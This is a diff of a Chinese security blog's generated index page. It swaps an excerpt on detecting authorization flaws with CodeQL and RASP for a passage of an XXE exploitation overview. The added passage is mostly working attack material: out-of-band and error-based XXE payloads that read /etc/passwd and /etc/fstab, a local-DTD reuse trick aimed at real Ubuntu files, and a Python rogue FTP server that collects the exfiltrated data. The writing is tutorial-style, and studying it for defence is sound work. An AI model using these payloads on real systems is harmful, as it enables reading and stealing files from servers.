-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测不安全的输入与已缓存的安全的数据是否符合</span></span><br><span class="line"><span class="comment">// getCurrentMember 是可信方法</span></span><br><span class="line">UmsMember member = memberService.getCurrentMember();</span><br><span class="line">OmsOrder order = orderMapper.selectByPrimaryKey(orderId);</span><br><span class="line"><span class="keyword">if</span>(!member.getId().equals(order.getMemberId()))&#123;</span><br><span class="line">    Asserts.fail(<span class="string">"不能确认他人订单！"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote_dtd SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;err.dtd&quot;&gt;</span><br><span class="line">%remote_dtd;</span><br><span class="line">%eval;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
-<p>执行数据操作的<code>DAO方法</code>有，CRUD操作，关于DAO方法有以下要点：</p>
-<p>​        是否返回前端：SELECT操作，仅查询结果的数据返回给到前端时，才有必要判断是否越权</p>
-<p>​        是否敏感数据：如商品信息的查询不需要检测是否越权，这些接口需要标记出来或是作为误报人工忽略</p>
-<p>​        DAO方法参数是否SQL约束：DAO方法的参数为多个或为Bean对象时，需要忽略非where查询的字段，如对于<code>userService.updateById(user)</code>，我们只需要检查user对象的userId来源是否可靠即可</p>
-<p>​                </p>
-<h3 id="3-2-codeql实践"><a href="#3-2-codeql实践" class="headerlink" title="3.2. codeql实践"></a>3.2. codeql实践</h3><h4 id="3-2-1-获取可信方法"><a href="#3-2-1-获取可信方法" class="headerlink" title="3.2.1. 获取可信方法"></a>3.2.1. 获取可信方法</h4><p>通过codeql的递归语法，我们在定义基础的可信方法后，递归这一结果，从而找到项目源码中所有预期的方法：</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/qll_TrustedMethod.png" alt="qll_TrustedMethod"></p>
-<p>有如下查询demo结果，递归过程如下  <code>ThreadLocal.get  -&gt; AuthUserContext.get -&gt; SecurityUtils.getSysUser()</code></p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/qll_getTrustedMethod.png" alt="qll_getTrustedMethod"></p>
-<p>递归获取可信方法 demo2：</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/qll_getTrustedMethod2.png" alt="qll_getTrustedMethod"></p>
-<h4 id="3-2-2-获取相关DAO方法"><a href="#3-2-2-获取相关DAO方法" class="headerlink" title="3.2.2. 获取相关DAO方法"></a>3.2.2. 获取相关DAO方法</h4><p>可以通过codeql的xml解析模块去解析项目源码中的mapper.xml文件从而获取DAO方法。</p>
-<p>目前为了简便，我先用Java代码写了一个mapper xml解析代码：</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/mapper_xml.png" alt="mapper_xml"></p>
-<p>定义相关DAO方法作为sink点：</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/qll_DaoMethod.png" alt="qll_DaoMethod"></p>
-<h4 id="3-2-3-查询是否越权"><a href="#3-2-3-查询是否越权" class="headerlink" title="3.2.3. 查询是否越权"></a>3.2.3. 查询是否越权</h4><p>在定义了DAO方法污点、可信方法 等谓词（逻辑判断词）的情况下，基于我们 <code>3.1思路</code> 去编写codeql查询规则，主要就是在 <code>HTTP入口-&gt;DAO查询</code> 这条数据链上查询相关节点数据是否经过可信方法的处理。</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/image-20230330164244539.png" alt="image-20230330164244539"></p>
-<h4 id="3-2-4-DAO-CUD案例"><a href="#3-2-4-DAO-CUD案例" class="headerlink" title="3.2.4. DAO CUD案例"></a>3.2.4. DAO CUD案例</h4><p>使用codeql查询不存在越权的 DAO CUD情况，该取消订单业务接口中，通过调用 service 方法 cancelOrders 从而调用DAO方法执行SQL进行订单取消，可以看到 order 对象的order.userId已经经过 <code>!Object.equal(order.getUserId(), userId)</code> 语句的校验</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/daoCudGood.png" alt="daoCudGood"></p>
-<p>codeql查询存在越权的DAO CUD执行</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/ql_DaoCud_black.png" alt="ql_DaoCud_black"></p>
-<h4 id="3-2-5-DAO-SELECT案例"><a href="#3-2-5-DAO-SELECT案例" class="headerlink" title="3.2.5. DAO SELECT案例"></a>3.2.5. DAO SELECT案例</h4><p>使用codeql查询不存在越权的DAO SELECT情况：</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/ql_DaoSelect_good.png" alt="ql_DaoSelect_good"></p>
-<p>使用codeql查询存在越权情况的 DAO Select方法执行：</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/ql_DaoSelect_black.png" alt="ql_DaoSelect_black"></p>
-<h4 id="3-2-6-问题总结"><a href="#3-2-6-问题总结" class="headerlink" title="3.2.6. 问题总结"></a>3.2.6. 问题总结</h4><p>1、DAO方法获取：还需要适配mybatis插件，如 baomidou 中可以直接 调用 servie 来进行DAO查询（通过注解Bean指明表名字段名插件则自动动态生成SQL查询语句）；以及DAO接口继承插件的BaseMapper，污点则为BaseMapper的方法</p>
-<p>2、DAO方法参数跟踪：目前还没根据SQL WHERE/IN判断的具体字段 来决定跟踪 DAO方法入参的字段 ，一方面如果项目SQL传参比较复杂或使用了Mybatis插件，我们通过静态的方式无法获取完整的SQL语句；另外就是这个方案也比较复杂，还在考量中。可能做成，只要DAO查询中某个参数经过可靠检查了，就忽略掉其他参数是否存在越权问题，当然，这个做法没有把解决问题做到极致。</p>
-<p>3、流中继中断问题：Codeql去查询污点(DAO方法)到源（HTTP接口）的这个过程，如果开发者使用了三方库，我们还需要编写额外的codeql谓词进行流中继，这也是codeql规则编写的通点</p>
-<p>4、误报问题：对于后台模块来说，基本不进行此类权限检测，所以本节的方法不使用于后台模块代码；此外，某些数据是操作是不敏感的，如商品信息的查询，这也是误报之一。</p>
-<h2 id="4-检测未授权与接口越权"><a href="#4-检测未授权与接口越权" class="headerlink" title="4. 检测未授权与接口越权"></a>4. 检测未授权与接口越权</h2><h3 id="4-1-框架问题"><a href="#4-1-框架问题" class="headerlink" title="4.1. 框架问题"></a>4.1. 框架问题</h3><p>通过codeql去识别接口是否有 框架路由授权、框架接口鉴权 ，从目前看到的shiro/spring-security框架来说，codeql具备可行性。具体的demo还未实践，后面这块就不继续关注了。</p>
-<h3 id="4-2-非框架未授权漏洞"><a href="#4-2-非框架未授权漏洞" class="headerlink" title="4.2. 非框架未授权漏洞"></a>4.2. 非框架未授权漏洞</h3><p>自动化检测中，对于自定义Filter/Interceptor， 需要结合IAST/RASP进行处理，但这需要构建相应的测试数据，这似乎又和手工测试同一个维度了，这点让人纠结。</p>
-<p>可通过RASP构建一次请求中某Filter的函数调用图，起初想Hook所有class，但是出现字节码错误，就粗略写了个demo稍微进行测试，代码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">   String authFilterId = <span class="string">"com.test.filter.AuthFilter#doFilter(Ljavax/servlet/ServletRequest;"</span> +</span><br><span class="line">               <span class="string">"Ljavax/servlet/ServletResponse;Ljavax/servlet/FilterChain;)V"</span>;</span><br><span class="line">   <span class="comment">// hook哪些包下的代码</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> String[] includePkgs = <span class="keyword">new</span> String[]&#123;<span class="string">"com.test"</span>&#125;;</span><br><span class="line">   <span class="comment">// 多叉树</span></span><br><span class="line">   ThreadLocal&lt;TreeNode&gt; tree = <span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line">   <span class="comment">// 修改被hook的方法的字节码，将 before 添加到调用前</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">(String methodId, Object[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (authFilterId.equals(methodId)) &#123;</span><br><span class="line">               <span class="keyword">if</span> (tree.get() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"递归问题未处理！"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               TreeNode root = <span class="keyword">new</span> TreeNode(methodId,<span class="keyword">null</span>);</span><br><span class="line">               tree.set(root);</span><br><span class="line">               root.setCurrent(root);</span><br><span class="line"></span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (tree.get() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">return</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               TreeNode root = tree.get();</span><br><span class="line">               TreeNode parent = root.getCurrent();</span><br><span class="line">               TreeNode node = <span class="keyword">new</span> TreeNode(methodId,parent);</span><br><span class="line">               parent.addChild(node);</span><br><span class="line">               root.setCurrent(node);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改被hook的方法的字节码，将 after 添加到调用后或抛异常后</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">(String methodId, Object[] args, Object ret, Exception exception)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (authFilterId.equals(methodId)) &#123;</span><br><span class="line">           TreeNode root = tree.get();</span><br><span class="line">           <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           System.out.println(<span class="string">"show call graph: "</span>);</span><br><span class="line">           TreeNode.PrettyPrint(root);</span><br><span class="line">           System.out.println(<span class="string">"------------------------------"</span>);</span><br><span class="line">           tree.set(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (tree.get() == <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           TreeNode root = tree.get();</span><br><span class="line">           root.setCurrent(root.getCurrent().getParent());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<img src="/2023/06/01/XXE%E6%A6%82%E8%A6%81/err_based_2.png" alt="err_based_2" style="zoom:67%;">
+
+
+
+<p>下面我们说说漏洞环境无法外联的情况下的利用方式</p>
+<p>首先内部DTD会优先于外部DTD先被XML处理器解析，而实体的定义不会被覆盖：</p>
+<img src="/2023/06/01/XXE%E6%A6%82%E8%A6%81/Users\work\AppData\Roaming\Typora\typora-user-images\image-20230509165851337.png" alt="image-20230509165851337" style="zoom:67%;">
+
+<p><code>/tmp/foo.dtd</code> ，由于需要发生多次错误，这个异常才会被抛出来，我们这里定义两个不同名称的element，并且在其定义中使用 PEReference</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY foo &#39;foo&#39;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT ele1 (%foo;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT ele2 (%foo;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们首先引用了外部DTD文档，随后定义实体<code>foo</code>，本地DTD的实体先被解析存储且不会/tmp/foo.dtd中的覆盖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;foo.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % foo &#39;aaa)&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">  	</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; trick SYSTEM &amp;#x27;url:&#x2F;&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;trick;&amp;#x25;eval;</span><br><span class="line">        </span><br><span class="line">        &lt;!ELEMENT aa (bb&#39;&gt;</span><br><span class="line"></span><br><span class="line">    %local_dtd;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当XML解析器解析/tmp/foo.dtd时，则会拼接文本数据，再进行eval解析，<code>ele1</code> 则解析成如下文本，最后又通过参数实体 trick 触发报错信息，回显数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT ele1 (aaa)&gt;</span><br><span class="line">        &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&quot;&gt;</span><br><span class="line">  	</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;url:&#x2F;&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">        %trick;%eval;</span><br><span class="line">        </span><br><span class="line">        &lt;!ELEMENT aa (bb)&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>实战中可将 /tmp/foo.dtd 替换为  <code>/usr/share/xml/fontconfig/fonts.dtd</code> ，该文件在ubuntu系统中常见</p>
+<img src="/2023/06/01/XXE%E6%A6%82%E8%A6%81/err_based_4.png" alt="err_based_4" style="zoom:67%;">
+
+<h3 id="数据转义"><a href="#数据转义" class="headerlink" title="数据转义"></a>数据转义</h3><p>XXE漏洞利用中，我们尝试通过回显的方式读取一些文本文件时可能会失败。</p>
+<p>使用如下方式读取/etc/fstab文件时会失败：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;fstab&quot;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;timestamp&quot;:&quot;2023-05-09T07:41:05.693+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;Error on line 4 of document  : The declaration for the entity \&quot;file\&quot; must end with &#39;&gt;&#39;. Nested exception: The declaration for the entity \&quot;file\&quot; must end with &#39;&gt;&#39;.&quot;,&quot;path&quot;:&quot;&#x2F;XXETest&#x2F;dom4j&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>失败原因为XML解析器将文件作为XML/DTD文档进行引用，当我们引用的文档不符合XML格式时造成本次解析处理失败</p>
+<p><img src="/2023/06/01/XXE%E6%A6%82%E8%A6%81/etc_fstab.png" alt="etc_fstab"></p>
+<p>解决思路就是将待读取的文件内容使用CDATA进行包裹，从而将其中的特殊字符转义。</p>
+<p><code>cdata.dtd</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;fstab&quot;&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&quot;&gt;</span><br><span class="line">&lt;!ENTITY all &#39;&lt;![CDATA[%file;]]&gt;&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这次我们的XML文档稍微变化一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root PUBLIC &quot;&quot; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;cdata.dtd&quot;&gt;</span><br><span class="line">&lt;root&gt;&amp;all;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/06/01/XXE%E6%A6%82%E8%A6%81/echo_etc_fstab.png" alt="echo_etc_fstab" style="zoom: 67%;">
+
+
+
+<h3 id="语言及限制"><a href="#语言及限制" class="headerlink" title="语言及限制"></a>语言及限制</h3><p>JAVA语言有：</p>
+<ul>
+<li>FTP：  &gt;=JDK8_131 FTP命令不能有换行，&gt;=JDK8_212 FTP URL不能有换行</li>
+<li>netdoc ：&gt;=JDK10 废弃该协议</li>
+<li>http/https：基本都不允许有换行符号</li>
+<li>jar：用于读取压缩文件内的文件，也可用于上传文件，上传的文件被存放于临时目录</li>
+</ul>
+<p><img src="/2023/06/01/XXE%E6%A6%82%E8%A6%81/protocol.png" alt="protocol"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.w3.org/TR/REC-xml" target="_blank" rel="noopener">https://www.w3.org/TR/REC-xml</a></p>
+<p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>
+<p><a href="https://www.youtube.com/watch?v=gjm6VHZa_8s&amp;ab_channel=PwnFunction" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gjm6VHZa_8s&amp;ab_channel=PwnFunction</a></p>
+<p>FTP服务器，python2:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">s.bind((<span class="string">'0.0.0.0'</span>,<span class="number">21</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'XXE-FTP listening '</span>)</span><br><span class="line">conn,addr = s.accept()</span><br><span class="line">print(<span class="string">'Connected by %s'</span>,addr)</span><br><span class="line">conn.sendall(<span class="string">'220 test FTP\r\n'</span>)</span><br><span class="line">stop = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> stop:</span><br><span class="line">    dp = str(conn.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">if</span> dp.find(<span class="string">"USER"</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">        conn.sendall(<span class="string">"331 password please - version check\r\n"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.sendall(<span class="string">"230 more data please!\r\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> dp.find(<span class="string">"RETR"</span>)==<span class="number">0</span> <span class="keyword">or</span> dp.find(<span class="string">"QUIT"</span>)==<span class="number">0</span>:</span><br><span class="line">        stop = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> dp.find(<span class="string">"CWD"</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">        print(dp.replace(<span class="string">'CWD '</span>,<span class="string">'/'</span>,<span class="number">1</span>).replace(<span class="string">'\r\n'</span>,<span class="string">''</span>),end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(dp)</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+
+
 
       
 
@@ -282,7 +329,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/">展开全文 >></a>
+          <a class="article-more-a" href="/2023/06/01/XXE%E6%A6%82%E8%A6%81/">展开全文 >></a>
         </p>
       
 
@@ -314,7 +361,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/31/">31</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/32/">32</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
     </nav>
   
 
